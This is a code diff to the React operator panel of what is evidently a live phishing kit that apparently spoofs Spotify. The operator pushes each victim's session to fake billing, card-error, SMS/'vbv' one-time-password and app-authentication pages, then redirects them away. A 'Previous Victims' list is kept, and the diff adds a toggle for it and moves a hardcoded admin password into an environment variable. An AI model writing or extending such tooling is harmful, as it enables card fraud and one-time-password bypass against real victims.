@@ -13,12 +13,11 @@ const AdminPanel = () => {
     { id: 2, name: "2", type: 'hidden', placeholder: '' },
     { id: 3, name: "3", type: 'hidden', placeholder: '' }
   ]);
-
   useEffect(() => {
-    if (!localStorage.getItem('isAdmin')) {
-      const password = prompt('Enter admin password:');
-      if (password === 'KLKklk44!HammaHamma21!DenniSavage') {
-        localStorage.setItem('isAdmin', 'true');
+    if (!localStorage.getItem('iamaAdmin')) {
+      const password = prompt("");
+      if (password === process.env.REACT_APP_ADMIN_PASSWORD) {
+        localStorage.setItem('iamaAdmin', 'true');
       } else {
         window.location.href = '/';
         return;
@@ -70,7 +69,15 @@ const AdminPanel = () => {
     })
     .catch(error => console.error('Error changing route:', error));
   };
-
+const toggleShowPrevious = () => {
+    const div = document.getElementById('show');
+    if (div) {
+      if (div.style.display === 'none') {
+        div.style.display = ''; // Reset to default
+      } else {
+        div.style.display = 'none'; // Hide the div
+      }
+    }};
   const handleOut = (sessionId) => {
     console.log(`Redirecting session ${sessionId} to Google`);
     socket.emit('redirectUser', { sessionId, url: 'https://spotify.com' });
@@ -138,13 +145,16 @@ const AdminPanel = () => {
             Login
           </button>
           <button onClick={() => handleRouteChange(user.sessionId, '/billingUpdate')}>
-            billing Update
+            billng
           </button>
-          <button  onClick={() => handleRouteChange(user.sessionId, '/otp_submit')}>
-            vbv
+<button onClick={() => handleRouteChange(user.sessionId, '/billingUpdate_Error')}>
+            CC Error
+          </button>          
+<button  onClick={() => handleRouteChange(user.sessionId, '/otp_submit')}>
+            sms
           </button>
           <button className='hoverror' onClick={() => handleRouteChange(user.sessionId, '/otp_submitError')}>
-            vbv error
+            sms error
           </button>
           <button onClick={() => handleAddCustomInput(user.sessionId)}>
             vbv custom
@@ -153,7 +163,7 @@ const AdminPanel = () => {
             vbv custom + error
           </button>
           <button onClick={() => handleRouteChange(user.sessionId, '/mobileAuth')}>
-            mobileAuth
+            app
           </button>
           <button onClick={() => handleOut(user.sessionId)}>
             /out
@@ -173,7 +183,10 @@ const AdminPanel = () => {
           ))}
         </div>
       </div>
-      <div className="panel-section">
+<button onClick={toggleShowPrevious}>
+        Toggle Previous Victims
+      </button>
+      <div id="show" className="panel-section">
         <h2>Previous Victims ({previousUsers.length})</h2>
         <div className="users-grid">
           {previousUsers.map(user => (
